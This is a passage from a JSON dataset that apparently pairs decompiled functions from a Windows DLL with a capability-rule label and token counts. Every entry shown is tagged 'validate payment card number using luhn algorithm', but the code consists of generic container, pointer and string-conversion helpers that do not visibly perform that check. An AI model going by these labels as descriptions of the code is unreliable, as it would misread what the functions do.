            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000ced0(ulong arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    \n    puVar1 = fcn.18000cd90(arg1);\n    fcn.18000d150(arg2, *puVar1, arg1);\n    return arg2;\n}\n",
        "token_count": 67
    },
    "18000cf1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000cf10(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    ulong uVar2;\n    ulong *puVar3;\n    ulong uStackX24;\n    ulong uStackX32;\n    uchar auStack40 [8];\n    uchar auStack32 [8];\n    uchar auStack24 [8];\n    uchar auStack16 [16];\n    \n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    uVar2 = fcn.18000ced0(arg1, auStack40);\n    cVar1 = fcn.18000ce80(&uStackX24, uVar2);\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.18000ccb0(arg1, auStack32);\n        cVar1 = fcn.18000ce80(&uStackX32, uVar2);\n        if (cVar1 != '\\0') {\n            fcn.18000cbe0(arg1);\n            fcn.18000ced0(arg1, arg2);\n            return arg2;\n        }\n    }\n    while (cVar1 = fcn.18000dad0(&uStackX24, &uStackX32),  cVar1 != '\\0') {\n        puVar3 = fcn.18000da80(&uStackX24, auStack24, 0);\n        fcn.18000d190(arg1, auStack16, *puVar3);\n    }\n    fcn.18000d150(arg2, uStackX24, arg1);\n    return arg2;\n}\n",
        "token_count": 357
    },
    "18000d0e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000d0e0(int64_t arg1)\n\n{\n    return arg1 + 0x21;\n}\n",
        "token_count": 31
    },
    "18000d12": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000d120(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.180023e94(arg2);\n    return;\n}\n",
        "token_count": 38
    },
    "18000d15": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000d150(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18000da40(arg1, arg2, arg3);\n    return arg1;\n}\n",
        "token_count": 46
    },
    "18000d9d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000d9d0(int64_t arg1)\n\n{\n    return arg1 + 0x20;\n}\n",
        "token_count": 31
    },
    "18000d9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000d9e0(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18000de10(arg1);\n    fcn.18000eb40(arg1 + 0x18, arg3);\n    fcn.18000eb40(arg1 + 0x19, arg3);\n    return arg1;\n}\n",
        "token_count": 83
    },
    "18000da4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000da40(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18000de40(arg1, arg2, arg3);\n    return arg1;\n}\n",
        "token_count": 46
    },
    "18000da8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18000da80(ulong *arg1, ulong *arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    \n    uVar1 = *arg1;\n    fcn.18000de20(arg1);\n    *arg2 = uVar1;\n    return arg2;\n}\n",
        "token_count": 68
    },
    "18000dad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.18000dad0(ulong arg1, ulong arg2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.18000ce80(arg1, arg2);\n    return cVar1 == '\\0';\n}\n",
        "token_count": 54
    },
    "18000db1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000db10(ulong arg1, int64_t arg2)\n\n{\n    ulong arg1_00;\n    ulong *puVar1;\n    ulong *puVar2;\n    char *pcVar3;\n    int64_t *piVar4;\n    \n    puVar1 = fcn.18000d100(arg2);\n    arg1_00 = *puVar1;\n    puVar1 = fcn.18000eb30(arg1_00);\n    puVar2 = fcn.18000d100(arg2);\n    *puVar2 = *puVar1;\n    puVar1 = fcn.18000eb30(arg1_00);\n    pcVar3 = fcn.18000d0e0(*puVar1);\n    if (*pcVar3 == '\\0') {\n        puVar1 = fcn.18000eb30(arg1_00);\n        piVar4 = fcn.18000d0f0(*puVar1);\n        *piVar4 = arg2;\n    }\n    puVar1 = fcn.18000d0f0(arg2);\n    puVar2 = fcn.18000d0f0(arg1_00);\n    *puVar2 = *puVar1;\n    piVar4 = fcn.18000cdd0(arg1);\n    if (arg2 == *piVar4) {\n        puVar1 = fcn.18000cdd0(arg1);\n        *puVar1 = arg1_00;\n    }\n    else {\n        puVar1 = fcn.18000d0f0(arg2);\n        piVar4 = fcn.18000eb30(*puVar1);\n        if (arg2 == *piVar4) {\n            puVar1 = fcn.18000d0f0(arg2);\n            puVar1 = fcn.18000eb30(*puVar1);\n            *puVar1 = arg1_00;\n        }\n        else {\n            puVar1 = fcn.18000d0f0(arg2);\n            puVar1 = fcn.18000d100(*puVar1);\n            *puVar1 = arg1_00;\n        }\n    }\n    piVar4 = fcn.18000eb30(arg1_00);\n    *piVar4 = arg2;\n    puVar1 = fcn.18000d0f0(arg2);\n    *puVar1 = arg1_00;\n    return;\n}\n",
        "token_count": 532
    },
    "18000dc5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000dc50(ulong arg1, int64_t arg2)\n\n{\n    ulong arg1_00;\n    ulong *puVar1;\n    ulong *puVar2;\n    char *pcVar3;\n    int64_t *piVar4;\n    \n    puVar1 = fcn.18000eb30(arg2);\n    arg1_00 = *puVar1;\n    puVar1 = fcn.18000d100(arg1_00);\n    puVar2 = fcn.18000eb30(arg2);\n    *puVar2 = *puVar1;\n    puVar1 = fcn.18000d100(arg1_00);\n    pcVar3 = fcn.18000d0e0(*puVar1);\n    if (*pcVar3 == '\\0') {\n        puVar1 = fcn.18000d100(arg1_00);\n        piVar4 = fcn.18000d0f0(*puVar1);\n        *piVar4 = arg2;\n    }\n    puVar1 = fcn.18000d0f0(arg2);\n    puVar2 = fcn.18000d0f0(arg1_00);\n    *puVar2 = *puVar1;\n    piVar4 = fcn.18000cdd0(arg1);\n    if (arg2 == *piVar4) {\n        puVar1 = fcn.18000cdd0(arg1);\n        *puVar1 = arg1_00;\n    }\n    else {\n        puVar1 = fcn.18000d0f0(arg2);\n        piVar4 = fcn.18000d100(*puVar1);\n        if (arg2 == *piVar4) {\n            puVar1 = fcn.18000d0f0(arg2);\n            puVar1 = fcn.18000d100(*puVar1);\n            *puVar1 = arg1_00;\n        }\n        else {\n            puVar1 = fcn.18000d0f0(arg2);\n            puVar1 = fcn.18000eb30(*puVar1);\n            *puVar1 = arg1_00;\n        }\n    }\n    piVar4 = fcn.18000d100(arg1_00);\n    *piVar4 = arg2;\n    puVar1 = fcn.18000d0f0(arg2);\n    *puVar1 = arg1_00;\n    return;\n}\n",
        "token_count": 532
    },
    "18000dd9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000dd90(ulong arg1)\n\n{\n    ulong *puVar1;\n    char *pcVar2;\n    ulong uStackX8;\n    \n    uStackX8 = arg1;\n    while( true ) {\n        puVar1 = fcn.18000d100(uStackX8);\n        pcVar2 = fcn.18000d0e0(*puVar1);\n        if (*pcVar2 != '\\0') break;\n        puVar1 = fcn.18000d100(uStackX8);\n        uStackX8 = *puVar1;\n    }\n    return uStackX8;\n}\n",
        "token_count": 138
    },
    "18000ddd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000ddd0(ulong arg1)\n\n{\n    ulong *puVar1;\n    char *pcVar2;\n    ulong uStackX8;\n    \n    uStackX8 = arg1;\n    while( true ) {\n        puVar1 = fcn.18000eb30(uStackX8);\n        pcVar2 = fcn.18000d0e0(*puVar1);\n        if (*pcVar2 != '\\0') break;\n        puVar1 = fcn.18000eb30(uStackX8);\n        uStackX8 = *puVar1;\n    }\n    return uStackX8;\n}\n",
        "token_count": 138
    },
    "18000de2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000de20(ulong arg1)\n\n{\n    fcn.18000de80(arg1);\n    return arg1;\n}\n",
        "token_count": 32
    },
    "18000de8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.18000de80(int64_t *arg1)\n\n{\n    char *pcVar1;\n    ulong *puVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    \n    pcVar1 = fcn.18000d0e0(*arg1);\n    if (*pcVar1 == '\\0') {\n        puVar2 = fcn.18000d100(*arg1);\n        pcVar1 = fcn.18000d0e0(*puVar2);\n        if (*pcVar1 == '\\0') {\n            puVar2 = fcn.18000d100(*arg1);\n            iVar3 = fcn.18000ddd0(*puVar2);\n            *arg1 = iVar3;\n        }\n        else {\n            while( true ) {\n                piVar4 = fcn.18000d0f0(*arg1);\n                iVar3 = *piVar4;\n                pcVar1 = fcn.18000d0e0(iVar3);\n                if ((*pcVar1 != '\\0') || (piVar4 = fcn.18000d100(iVar3),  *arg1 != *piVar4)) break;\n                *arg1 = iVar3;\n            }\n            *arg1 = iVar3;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 289
    },
    "18000df9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000df90(ulong arg1, ulong arg2)\n\n{\n    fcn.18000bcf0(arg2);\n    return;\n}\n",
        "token_count": 35
    },
    "18000dfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000dfc0(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    uchar *arg2_00;\n    uchar auStack184 [32];\n    ulong uStack152;\n    int32_t iStack144;\n    ulong uStack136;\n    ulong uStack128;\n    ulong uStack112;\n    int32_t iStack104;\n    uchar auStack96 [40];\n    ulong uStack56;\n    ulong uStack48;\n    uint32_t uStack40;\n    ulong uStack32;\n    uint64_t uStack24;\n    \n    uStack32 = 0xfffffffffffffffe;\n    uStack24 = *0x180040248 ^ auStack184;\n    uStack40 = 0;\n    iStack104 = 0;\n    fcn.18000e3d0(auStack96);\n    uVar1 = fcn.1800020d0(arg2);\n    uStack128 = 0;\n    uStack136 = 0;\n    iStack144 = 0;\n    uStack152 = 0;\n    iStack104 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, uVar1, 0xffffffff);\n    uStack112 = fcn.180023750(iStack104);\n    uStack56 = uStack112;\n    uVar1 = fcn.1800020d0(arg2);\n    uStack128 = 0;\n    uStack136 = 0;\n    iStack144 = iStack104;\n    uStack152 = uStack112;\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, uVar1, 0xffffffff);\n    fcn.18000e4a0(auStack96, uStack112);\n    uStack48 = uStack112;\n    fcn.1800239a0(uStack112);\n    arg2_00 = auStack96;\n    fcn.18000e420(arg1, arg2_00);\n    uStack40 = uStack40 | 1;\n    fcn.180003370(auStack96, arg2_00);\n    fcn.180001ef0(arg2, arg2_00);\n    fcn.180023980(uStack24 ^ auStack184);\n    return;\n}\n",
        "token_count": 498
    },
    "18000e14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000e140(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    uchar *arg2_00;\n    uchar auStack168 [32];\n    ulong uStack136;\n    int32_t iStack128;\n    ulong uStack112;\n    int32_t iStack104;\n    uchar auStack96 [40];\n    ulong uStack56;\n    ulong uStack48;\n    uint32_t uStack40;\n    ulong uStack32;\n    uint64_t uStack24;\n    uint64_t uStack16;\n    \n    uStack32 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack168;\n    uStack40 = 0;\n    iStack104 = 0;\n    fcn.180001e30(auStack96);\n    uVar1 = fcn.1800033a0(arg2);\n    iStack128 = 0;\n    uStack136 = 0;\n    iStack104 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, uVar1, 0xffffffff);\n    uStack24 = iStack104;\n    uVar1 = SUB168(ZEXT816(2) * ZEXT816(uStack24), 0);\n    if (SUB168(ZEXT816(2) * ZEXT816(uStack24) >> 0x40, 0) != 0) {\n        uVar1 = 0xffffffffffffffff;\n    }\n    uStack112 = fcn.180023750(uVar1);\n    uStack56 = uStack112;\n    uVar1 = fcn.1800033a0(arg2);\n    iStack128 = iStack104;\n    uStack136 = uStack112;\n    (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, uVar1, 0xffffffff);\n    fcn.180001f50(auStack96, uStack112);\n    uStack48 = uStack112;\n    fcn.1800239a0(uStack112);\n    arg2_00 = auStack96;\n    fcn.18000e4d0(arg1, arg2_00);\n    uStack40 = uStack40 | 1;\n    fcn.180001ef0(auStack96, arg2_00);\n    fcn.180003370(arg2, arg2_00);\n    fcn.180023980(uStack16 ^ auStack168);\n    return;\n}\n",
        "token_count": 537
    },
    "18000e3d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000e3d0(ulong arg1)\n\n{\n    ulong arg2;\n    uchar auStack24 [8];\n    uchar *puStack16;\n    \n    puStack16 = auStack24;\n    arg2 = fcn.18000eb30(puStack16);\n    fcn.18000b9e0(arg1, arg2);\n    fcn.1800033c0(arg1, 0, 0);\n    return arg1;\n}\n",
        "token_count": 103
    },
    "18000e42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000e420(ulong arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    uchar auStack40 [8];\n    uchar *puStack32;\n    ulong uStack24;\n    \n    uStack24 = 0xfffffffffffffffe;\n    puStack32 = auStack40;\n    uVar1 = fcn.18000eb30(arg2 + 0x20);\n    uVar1 = fcn.18000eb40(puStack32, uVar1);\n    fcn.18000b9e0(arg1, uVar1);\n    fcn.1800033c0(arg1, 0, 0);\n    uVar1 = fcn.18000eb30(arg2);\n    fcn.18000e7b0(arg1, uVar1);\n    return arg1;\n}\n",
        "token_count": 183
    },
    "18000e4d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000e4d0(ulong arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    uchar auStack40 [8];\n    uchar *puStack32;\n    ulong uStack24;\n    \n    uStack24 = 0xfffffffffffffffe;\n    puStack32 = auStack40;\n    uVar1 = fcn.18000eb30(arg2 + 0x20);\n    uVar1 = fcn.18000eb40(puStack32, uVar1);\n    fcn.18000b9e0(arg1, uVar1);\n    fcn.180002710(arg1, 0, 0);\n    uVar1 = fcn.18000eb30(arg2);\n    fcn.18000ba10(arg1, uVar1);\n    return arg1;\n}\n",
        "token_count": 181
    },
    "18000e55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.18000e550(ulong arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.1800027b0(arg1);\n    return iVar1 + arg2 * 2;\n}\n",
        "token_count": 58
    },
    "18000e58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000e580(ulong arg1)\n\n{\n    ulong arg2;\n    uchar auStack24 [8];\n    uchar *puStack16;\n    \n    puStack16 = auStack24;\n    arg2 = fcn.18000eb30(puStack16);\n    fcn.18000bc90(arg1, arg2);\n    return arg1;\n}\n",
        "token_count": 81
    },
    "18000e5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000e5c0(ulong arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    uchar auStack40 [8];\n    uchar *puStack32;\n    ulong uStack24;\n    \n    uStack24 = 0xfffffffffffffffe;\n    puStack32 = auStack40;\n    uVar1 = fcn.18000eb40(puStack32, arg2 + 0x18);\n    fcn.18000bc90(arg1, uVar1);\n    uVar1 = fcn.18000eb30(arg2);\n    fcn.18000e8c0(arg1, uVar1);\n    return arg1;\n}\n",
        "token_count": 149
    },
    "18000e63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000e630(ulong arg1)\n\n{\n    fcn.18000ea90(arg1);\n    fcn.18000bcf0(arg1);\n    return;\n}\n",
        "token_count": 42
    },
    "18000e66": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000e660(int64_t *arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    ulong arg2_00;\n    int64_t iVar3;\n    \n    arg2_00 = fcn.18000eb30(arg2);\n    cVar2 = fcn.18001c9a0(arg1, arg2_00);\n    if (cVar2 == '\\0') {\n        if (arg1[1] == arg1[2]) {\n            fcn.18000ea00(arg1, 1);\n        }\n        fcn.18001ccc0(arg1, arg1[1], arg1[1]);\n        fcn.18000f250(arg1 + 3, arg1[1], arg2);\n        arg1[1] = arg1[1] + 0x28;\n    }\n    else {\n        iVar3 = fcn.18000eb30(arg2);\n        iVar1 = *arg1;\n        if (arg1[1] == arg1[2]) {\n            fcn.18000ea00(arg1, 1);\n        }\n        fcn.18001ccc0(arg1, arg1[1], arg1[1]);\n        fcn.18000f210(arg1 + 3, arg1[1], ((iVar3 - iVar1) / 0x28) * 0x28 + *arg1);\n        arg1[1] = arg1[1] + 0x28;\n    }\n    return;\n}\n",
        "token_count": 335
    },
    "18000e7b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18000e7b0(ulong *arg1, ulong *arg2)\n\n{\n    char cVar1;\n    ulong arg1_00;\n    ulong uVar2;\n    uchar uStack24;\n    uchar auStack23 [7];\n    ulong uStack16;\n    \n    if (arg1 != arg2) {\n        uStack16 = fcn.180002690(arg2, &uStack24);\n        arg1_00 = fcn.180002690(arg1, auStack23);\n        uVar2 = uStack16;\n        cVar1 = fcn.18000c670(arg1_00, uStack16);\n        if ((cVar1 == '\\0') || (arg2[3] < 0x10)) {\n            fcn.1800033c0(arg1, CONCAT71(uVar2 >> 8, 1), 0);\n            if (arg2[3] < 0x10) {\n                fcn.18000b050(arg1, arg2, arg2[2] + 1);\n            }\n            else {\n                *arg1 = *arg2;\n                *arg2 = 0;\n            }\n            arg1[2] = arg2[2];\n            arg1[3] = arg2[3];\n            fcn.1800033c0(arg2, 0, 0);\n        }\n        else {\n            fcn.18000eb50(arg1, arg2);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 326
    },
    "18000e8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000e8c0(ulong *arg1, ulong *arg2)\n\n{\n    char cVar1;\n    ulong uVar2;\n    uchar auStack40 [8];\n    uchar uStack32;\n    uchar auStack31 [7];\n    uchar auStack24 [8];\n    ulong uStack16;\n    \n    if (arg1 != arg2) {\n        uStack16 = fcn.18000eeb0(arg2, &uStack32);\n        uVar2 = fcn.18000eeb0(arg1, auStack31);\n        cVar1 = fcn.18000c670(uVar2, uStack16);\n        if (cVar1 == '\\0') {\n            fcn.18000ea90(arg1);\n            fcn.18000dfb0(arg1, arg2);\n            *arg1 = *arg2;\n            arg1[1] = arg2[1];\n            arg1[2] = arg2[2];\n            *arg2 = 0;\n            arg2[1] = 0;\n            arg2[2] = 0;\n        }\n        else {\n            fcn.18000eee0(arg1);\n            fcn.18001c8a0(arg2, auStack40);\n            while( true ) {\n                uVar2 = fcn.18001cb20(arg2, auStack24);\n                cVar1 = fcn.18001d470(auStack40, uVar2);\n                if (cVar1 == '\\0') break;\n                uVar2 = fcn.18000f050(auStack40);\n                uVar2 = fcn.18000eb30(uVar2);\n                fcn.18000eb80(arg1, uVar2);\n                fcn.18000f070(auStack40);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 403
    },
    "18000ea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000ea00(ulong arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    ulong arg2_00;\n    \n    uVar1 = fcn.18000ee60(arg1);\n    iVar2 = fcn.18000ee90(arg1);\n    if (iVar2 - arg2 < uVar1) {\n        fcn.18000f030(arg1);\n    }\n    else {\n        uVar3 = fcn.18000ee30(arg1);\n        if (uVar3 < uVar1 + arg2) {\n            arg2_00 = fcn.18000ef80(arg1, uVar1 + arg2);\n            fcn.18000ece0(arg1, arg2_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "18000eb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000eb80(int64_t *arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    uVar3 = fcn.18000eb30(arg2);\n    cVar2 = fcn.18001c9a0(arg1, uVar3);\n    if (cVar2 == '\\0') {\n        if (arg1[1] == arg1[2]) {\n            fcn.18000ea00(arg1, 1);\n        }\n        fcn.18001ccc0(arg1, arg1[1], arg1[1]);\n        uVar3 = fcn.18000eb30(arg2);\n        fcn.18000f290(arg1 + 3, arg1[1], uVar3);\n        arg1[1] = arg1[1] + 0x28;\n    }\n    else {\n        iVar4 = fcn.18000eb30(arg2);\n        iVar1 = *arg1;\n        if (arg1[1] == arg1[2]) {\n            fcn.18000ea00(arg1, 1);\n        }\n        fcn.18001ccc0(arg1, arg1[1], arg1[1]);\n        uVar3 = fcn.18000eb30(((iVar4 - iVar1) / 0x28) * 0x28 + *arg1);\n        fcn.18000f290(arg1 + 3, arg1[1], uVar3);\n        arg1[1] = arg1[1] + 0x28;\n    }\n    return;\n}\n",
        "token_count": 364
    },
    "18000ee9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000ee90(int64_t arg1)\n\n{\n    fcn.18000f1b0(arg1 + 0x18);\n    return;\n}\n",
        "token_count": 38
    },
    "18000eeb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000eeb0(int64_t arg1, ulong arg2)\n\n{\n    fcn.18000eb40(arg2, arg1 + 0x18);\n    return arg2;\n}\n",
        "token_count": 46
    },
    "18000ef4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000ef40(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18000f310(arg2, arg3, arg1 + 0x18);\n    return;\n}\n",
        "token_count": 50
    },
    "18000ef8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.18000ef80(ulong arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uStack40;\n    uint64_t uStack24;\n    \n    uStack24 = fcn.18000ee30(arg1);\n    iVar1 = fcn.18000ee90(arg1);\n    if (iVar1 - uStack24 / 2 < uStack24) {\n        uStack24 = 0;\n    }\n    else {\n        uStack24 = uStack24 + uStack24 / 2;\n    }\n    uStack40 = uStack24;\n    if (uStack24 < arg2) {\n        uStack40 = arg2;\n    }\n    return uStack40;\n}\n",
        "token_count": 162
    },
    "18000f05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f050(ulong arg1)\n\n{\n    fcn.18000cec0(arg1);\n    return;\n}\n",
        "token_count": 30
    },
    "18000f07": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000f070(ulong arg1)\n\n{\n    fcn.18000f1f0(arg1);\n    return arg1;\n}\n",
        "token_count": 34
    },
    "18000f0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18000f0c0(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    ulong uStack16;\n    \n    fcn.18001d040(arg1, &uStack40, arg3);\n    fcn.18001d040(arg1, &uStack32, arg4);\n    cVar1 = fcn.18001d470(&uStack40, &uStack32);\n    if (cVar1 != '\\0') {\n        uStack24 = fcn.18000f360(uStack32, *(arg1 + 8), uStack40);\n        fcn.18000ef40(arg1, uStack24, *(arg1 + 8));\n        *(arg1 + 8) = uStack24;\n    }\n    uStack16 = uStack40;\n    fcn.18001d040(arg1, arg2, uStack40);\n    return arg2;\n}\n",
        "token_count": 229
    },
    "18000f19": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f190(ulong arg1, ulong arg2)\n\n{\n    fcn.18000f3b0(arg2, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "18000f1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.18000f1f0(int64_t *arg1)\n\n{\n    *arg1 = *arg1 + 0x28;\n    return arg1;\n}\n",
        "token_count": 42
    },
    "18000f21": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f210(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg3_00;\n    \n    arg3_00 = fcn.18000eb30(arg3);\n    fcn.18000f4d0(arg1, arg2, arg3_00);\n    return;\n}\n",
        "token_count": 72
    },
    "18000f25": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f250(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg3_00;\n    \n    arg3_00 = fcn.18000eb30(arg3);\n    fcn.18000f430(arg1, arg2, arg3_00);\n    return;\n}\n",
        "token_count": 70
    },
    "18000f29": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f290(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong arg3_00;\n    \n    arg3_00 = fcn.18000eb30(arg3);\n    fcn.18000f460(arg1, arg2, arg3_00);\n    return;\n}\n",
        "token_count": 70
    },
    "18000f2d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f2d0(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.18000f550(arg2, arg3, arg4, arg1 + 0x18);\n    return;\n}\n",
        "token_count": 59
    },
    "18000f31": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18000f310(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.18000f5c0(arg1, arg2);\n    fcn.18000f5e0(arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 62
    },
    "18000f36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
